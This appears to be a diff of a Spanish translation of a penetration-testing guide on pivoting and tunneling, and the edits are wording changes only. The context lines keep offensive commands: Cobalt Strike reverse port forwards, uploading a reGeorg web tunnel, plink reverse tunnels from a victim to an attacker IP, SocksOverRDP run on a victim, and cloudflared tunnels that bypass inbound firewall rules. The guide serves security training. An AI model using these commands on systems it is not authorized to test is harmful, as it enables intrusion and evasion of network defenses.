@@ -149,21 +149,21 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host del beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-- La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor de Equipo, no para retransmitir entre máquinas individuales**.
-- El tráfico está **tuneleado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
+- La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
+- El tráfico está **tuneado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
 - **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
 
 ### rPort2Port local
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host de beacon**, no en el Servidor del Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor del Equipo) y desde allí al host:puerto indicado.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -172,7 +172,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Necesitas subir un archivo web de túnel: ashx|aspx|js|jsp|php|php|jsp
+Necesitas subir un archivo web túnel: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -199,7 +199,7 @@ Necesitas usar la **misma versión para el cliente y el servidor**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Utiliza la misma versión para el agente y el proxy**
+**Usa la misma versión para el agente y el proxy**
 
 ### Tunneling
 ```bash
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
 
-Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
+Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -348,9 +348,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ## SocksOverRDP & Proxifier
 
 Necesitas tener **acceso RDP sobre el sistema**.\
-Descargar:
+Descarga:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **tunneling packets over the RDP connection**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnel de paquetes sobre la conexión RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
@@ -358,7 +358,7 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **connect** a la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que dice que el **SocksOverRDP plugin is enabled**, y que **listen** en **127.0.0.1:1080**.
+Ahora podemos **connect** a la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que dice que el **SocksOverRDP plugin is enabled**, y estará **listen** en **127.0.0.1:1080**.
 
 **Connect** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen **servicios TCP/UDP locales** sin requerir reglas de firewall de entrada, utilizando el borde de Cloudflare como punto de encuentro. Esto es muy útil cuando el firewall de salida solo permite tráfico HTTPS pero las conexiones de entrada están bloqueadas.
+El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen **servicios TCP/UDP locales** sin requerir reglas de firewall entrantes, utilizando el borde de Cloudflare como punto de encuentro. Esto es muy útil cuando el firewall de salida solo permite tráfico HTTPS pero las conexiones entrantes están bloqueadas.
 
 ### Comando rápido para túnel
 ```bash
@@ -555,7 +555,7 @@ El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen
 cloudflared tunnel --url http://localhost:8080
 # => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
 ```
-### SOCKS5 pivot
+### Pivot de SOCKS5
 ```bash
 # Turn the tunnel into a SOCKS5 proxy on port 1080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
